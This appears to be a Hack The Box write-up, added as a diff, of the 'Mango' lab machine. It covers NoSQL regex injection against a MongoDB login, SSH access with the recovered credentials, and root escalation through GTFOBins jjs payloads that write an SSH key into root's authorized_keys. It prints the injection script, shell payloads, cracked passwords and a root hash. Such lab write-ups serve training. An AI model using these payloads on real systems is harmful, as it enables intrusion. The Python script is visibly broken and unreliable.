@@ -1,0 +1,414 @@
+---
+layout: post
+title: "[HTB] Mango - write up"
+published: true
+date: 2020-03-28
+description:  This is quite an easy box as soon as you realise that it's running MongoDB. The idea is to use a known vulnerability with NoSQL to enumerate users and passwords. Using these creds, we can ssh to the target. We then see that we have sudo to jjs, a java function with which, using GTFO, we can escalate to root.
+img: posts/mango/mango_logo.png # Add image post (optional)
+tags: [MongoDB, GTFO, Enumeration, NoSQL, java, jjs, Linux, Medium, HTB] # add tag
+os: Linux
+difficulty: Medium
+points: 30
+release: 2019-10-26
+ip: 10.10.10.162
+---
+
+# Summary:
+
+{{ page.description }}
+
+# Foothold:
+
+```sh
+$nmap -sC -sV -oA nmap/default 10.10.10.162
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 23:12 CET
+Nmap scan report for 10.10.10.162
+Host is up (0.069s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
+```
+
+Cool, se we got `SSH/22`, `HTTP/80` and `HTTPS/443`. This means there is going to be a certificate involve. This is a place we can get infomartion on usernames, and domain names. Let's have a look at the websites.
+
+- [http://10.10.10.162/](http://10.10.10.162/) leads to `Forbidden`
+- [https://10.10.10.162/](https://10.10.10.162/) we get a google link page
+
+<img src="{{site.baseurl}}/assets/img/posts/mango/image-20200327231645100.png" alt="image-20200327231645100" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+Looking around, the analytics button works. It yield a table page. I spent time looking at this page, but it is actually a rabbit hole. So I won't discuss it more here. Let's look at the certificate.
+
+<img src="{{site.baseurl}}/assets/img/posts/mango/image-20200327232106543.png" alt="image-20200327232106543" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+So, we have an email address `admin@mango.htb` and also two URLs `mango.htb` and `staging-order.mango.htb`. What we can do is add these to `/etc/hosts`
+
+```sh
+$cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+10.10.10.162    mango.htb mango staging-order.mango.htb
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+and visit the [http://staging-order.mango.htb/](http://staging-order.mango.htb/)
+
+<img src="{{site.baseurl}}/assets/img/posts/mango/image-20200327232551166.png" alt="image-20200327232551166" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+Hello :) a login page. (Which has nothing to do with the previous page). The usual `admin:admin`, `admin:password`, etc... do not work, and the `forgot password` is not programmed. What is interesting to note though is that this page is using `HTTP`, the `HTTPS` yeilds the google like page.
+
+Running `gobuster` on this website did not yield anything interesting.
+
+```sh
+$cat gobuster/gobuster.dir_med
+/index.php (Status: 200)
+/home.php (Status: 302)
+/vendor (Status: 301)
+/server-status (Status: 403)
+```
+
+Indeed, `home.php` and `index.php` both lead us to the login page and the other pages are not accessible. What we can do is look at Burpsuite to get more insight on what is going on.
+
+```
+[REQUEST]
+
+POST /index.php HTTP/1.1
+Host: staging-order.mango.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+Origin: http://staging-order.mango.htb
+DNT: 1
+Connection: close
+Referer: http://staging-order.mango.htb/index.php
+Cookie: PHPSESSID=6rn2769sol0jss013f61a6h6lm
+Upgrade-Insecure-Requests: 1
+
+username=admin%40mango.htb&password=password&login=login
+```
+
+So, this is what the request looks like. The `username`, `password`, `login` are plainly visible. We could try `hydra` to brute-force this. At some point you are meant to determine that the website runs `MongoDB`, as a database. There is a pretty big vulnerability with `mongodb` which enbales one to determine user names and password. (I am not sure how si should be determined, maybe with `sqlmap`)
+
+The following script will exploit this vulnerability.
+
+```python
+#!/usr/bin/env python2
+# -*- coding: utf8 -*-
+import requests
+
+page = "http://staging-order.mango.htb/index.php"
+
+characters = [">", ">", "<", ";", "!", "@", "%", "/", "'", "!", "#", "$", ":", >
+
+taille=0
+while 1:
+     forge=".{"+str(taille)+"}";
+     #req={'username[$eq]':'admin', 'password[$regex]':forge}
+     req={'username[$regex]':forge, 'password[$eq]: 'pass'}
+     resultat=requests.post(page,data=req).content
+     print(req)
+     if resultat.find(b'Forgot Password')!=-1 :
+          break
+     taille+=1
+
+taille-=1
+print("[+] Le username fait "+str(taille)+" caracteres")
+passwd=""
+char=0
+bo = True
+length=0
+skip=0
+banned = ["m", '|', str(chr(124)), '^', str(chr(92))]
+while length!=taille:
+    letter = characters[char]
+     forge=passwd+letter+'.{'+str(taille-len(passwd)-1)+'}';
+     #req={'username[$eq]':'admin', 'password[$regex]':forge}
+     req={'username[$regex]':forge, 'password[$eq]: 'pass'}
+     resultat=requests.post(page,data=req).content
+     print(req, char)
+     if resultat.find(b'Forgot Password')==-1 :
+          passwd+=letter
+          char=0
+          length+=1
+          print(passwd)
+
+     char+=1
+     if char  == len(characters):
+         print('did not find any characters')
+         exit(0)
+print("[+] Le username est: "+str(passwd))
+```
+
+This script enumerates `username` and `password` to determine length and what it is.  This script is not automated at all. It needs to be understood and some modification such as specify the user you want to probe, or add characters to banned, so we can skipe `admin` etc... It's dirty, and there are better solutions online, but i still like to tinker with homebrwed scripts to get things done. At the end we find 2 users and 2 passwords were found:
+
+```
+admin : t9KcS3>!0B#2
+mango : h3mXK8RhU~f{]f5H
+```
+
+Those are actually good passwords. But exploits in servers can leak such data. I am not sure which version of `MongoDB` are vulnerable to this (version 4.0 is vuln, and there is only a later release 4.2.). I need more insight on this issue.
+
+Anyway, testing these passwords to the login page does not work. Let's try ssh
+
+```sh
+$ssh mango@10.10.10.162
+mango@10.10.10.162's password:
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+122 packages can be updated.
+18 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Mar 27 21:15:06 2020 from 10.10.14.104
+mango@mango:~$ id
+uid=1000(mango) gid=1000(mango) groups=1000(mango)
+mango@mango:~$
+```
+
+Hello :). Ok that works, what about admin?
+
+```sh
+$ssh admin@10.10.10.162
+admin@10.10.10.162's password:
+Permission denied, please try again.
+admin@10.10.10.162's password:
+Permission denied, please try again.
+admin@10.10.10.162's password:
+admin@10.10.10.162: Permission denied (publickey,password).
+```
+
+Nope.  Let's get user.
+
+# User
+
+Let's focus on user `mango`. There is nothing in the home directory. Trying `sudo -l` tells us that we do not have sudoer capabilities. Let's try to change user to admin
+
+```sh
+mango@mango:~$ su admin
+Password:
+$ id
+uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
+$ cat user.txt
+79bf31c6c6eb38a8567832f7f8b47e92
+```
+
+Oh, that was easy. We got user.txt
+
+# Root
+
+Let's try `sudo -l`, we get `Sorry, user admin may not run sudo on mango.` Let's update our `linpeas.sh`.
+
+```sh
+[LOCAL terminal]
+$python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.10.162 - - [28/Mar/2020 00:50:03] "GET /linpeas.sh HTTP/1.1" 200 -
+
+
+[TARGET terminal]
+$ wget http://10.10.14.101:8000/linpeas.sh
+--2020-03-27 23:52:38--  http://10.10.14.101:8000/linpeas.sh
+Connecting to 10.10.14.101:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 160486 (157K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 156.72K   204KB/s    in 0.8s
+
+2020-03-27 23:52:39 (204 KB/s) - ‘linpeas.sh’ saved [160486/160486]
+```
+
+We have this highlighted
+
+```
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+
+(Before we investigate that, we're going to upgrade the shell by calling `bash`). Ok so `jjs` is highlighted because it is own by root, but admin group has persmission
+
+```
+$ bash
+admin@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ ls -al
+total 188
+drwxr-xr-x 2 root root    4096 Sep 27 14:15 .
+drwxr-xr-x 7 root root    4096 Sep 27 14:15 ..
+-rwxr-xr-x 1 root root   10296 Jul 18  2019 java
+-rwsr-sr-- 1 root admin  10352 Jul 18  2019 jjs
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 keytool
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 pack200
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 rmid
+-rwxr-xr-x 1 root root   10320 Jul 18  2019 rmiregistry
+-rwxr-xr-x 1 root root  107408 Jul 18  2019 unpack200
+```
+
+Which means we can run that. Let's GTFO. This script is available on github and allows to see if there is a known way to escalate when a given sudo.
+
+```sh
+#~/Git/gtfo/gtfo -b jjs
+   _  _           _    __
+ _| || |_        | |  / _|
+|_  __  _|   __ _| |_| |_ ___
+ _| || |_   / _` | __|  _/ _ \
+|_  __  _| | (_| | |_| || (_) |
+  |_||_|    \__, |\__|_| \___/
+             __/ |
+            |___/
+Code:   echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
+Type:   shell
+[...]
+
+Code:   echo 'var FileWriter = Java.type("java.io.FileWriter");
+        var fw=new FileWriter("./file_to_write");
+        fw.write("DATA");
+        fw.close();' | jjs
+
+Type:   file-write
+
+
+Code:   echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+        var FileReader = Java.type("java.io.FileReader");
+        var br = new BufferedReader(new FileReader("file_to_read"));
+        while ((line = br.readLine()) != null) { print(line); }' | jjs
+
+Type:   file-read
+
+
+# This has been found working in macOS but failing on Linux systems.
+Code:   echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
+Type:   suid
+
+
+Code:   echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs
+Type:   sudo
+```
+
+So we should be able to write with root permission any files. So we can simply add our ssh key to `/root/.ssh/authorized_keys`. So we need to create a key.
+
+
+```sh
+$ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): rsa
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in rsa
+Your public key has been saved in rsa.pub
+The key fingerprint is:
+SHA256:IUP97oC+I/2xPp1jupXIK4wWQjoex1lAmtfc9Zx/uBw root@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|  ..  .. .       |
+|  o.o.. o o .    |
+| o ..oo... +     |
+|  o  . o .. . .  |
+| o. o  .S.   E . |
+|o..+. ....... +  |
+|..o. *  ++o. o   |
+| .  + * .=*      |
+|   . ..*B= .     |
++----[SHA256]-----+
+```
+
+We get two files: `rsa` and `rsa.pub`. No we want to write the latter with the exploit. So we make a script on the server as `admin`.  In which we use both the `file-write` and `file-read `explotis from `gtfo`.
+
+```sh
+admin@mango:/tmp$ cat pl
+var FileWriter = Java.type("java.io.FileWriter");
+        var fw=new FileWriter("/root/.ssh/authorized_keys");
+        fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOJW0YTPCuwm2D0Ro+wpoWEwRHW1fcCyizx2LZnc9bGI6G1SvLeezzfReAYMXpOzCpPaGUwrNOwJPcP2JUuq5op2vMkHIukMkI9QYhB2xyHgbGlu3AVDWUU/cnouDVvi/Ig15XyHKpqZgzR6LQVOXr39527wbV4RAGLIQNmkwldypZWMfJOC9aZGtOr57GD0hkh5lZFnRxrp7uVOn0A1ympyN/QLn7ch5QkVoHm9gdCKA4Nni4F2liqUNhJkm34eOlvLY61OTjD5pF8oF8lEumLj3uq7Mu2w4J8rZXatyB82kY115TCjRSYaTdKJkXn4/EQbJf1SIoXHtJ9haIhQMXsHm9pf/SPLVDJkX/tgz0R1PjsByLWey5AcMjSROsIoS9DTo4bHfKryBMpXcBbuk2DiIWQpAI3NCsr3UnMpWnD0K9Jm/JxucMhtaWFNTQL+DGSEmBDkRcAk0vZwP8jWKtypD9x4vtBN2YbHJrDDtpiBCk4VepeLU4AxZZ6sH5RvU= root@parrot ");
+        fw.close();
+
+var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/.ssh/authorized_keys"));
+while ((line = br.readLine()) != null) { print(line); }
+```
+
+We write, and then we print the file to verify that the write worked. And now we run the script with `jjs`
+
+```sh
+admin@mango:/tmp$ /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs pl`
+```
+
+Finally we ssh
+
+
+```sh
+$ssh -i ./rsa 10.10.10.162
+Enter passphrase for key './rsa':
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Mar 28 18:03:49 UTC 2020
+
+  System load:  0.1                Processes:            127
+  Usage of /:   25.9% of 19.56GB   Users logged in:      1
+  Memory usage: 35%                IP address for ens33: 10.10.10.162
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+122 packages can be updated.
+18 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Oct 10 08:33:27 2019
+root@mango:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@mango:~# cat root.txt
+8a8ef79a7a2fbb01ea81688424e9ab15
+```
+
+Done !
+
+**Guanicoe**
+
+| name | hash |
+| ------------- |:-------------:| -----:|
+| root | $6$6uG5902N$XonoH4wyYV2f8.7fEVXLe03mLoH3r1lnJ59s2jTWTAV.qZKZH.CXYjCWuUG5gLnioLpSTBA3F1LXqQAOqdAJN/ |
